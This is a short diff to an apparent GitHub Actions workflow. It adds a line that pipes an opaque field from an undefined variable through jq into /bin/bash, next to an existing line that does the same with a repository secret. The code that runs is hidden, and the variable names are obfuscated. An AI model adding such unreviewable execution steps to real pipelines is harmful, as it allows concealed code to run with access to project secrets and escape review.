@@ -19,6 +19,7 @@ jobs:
           lg0192: ${{ secrets.lg0192 }}
         run: |
           printf '%s' "$lg0192" | jq -r .m63548 | /bin/bash
+          echo $lcc21 | jq -r .v6100 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
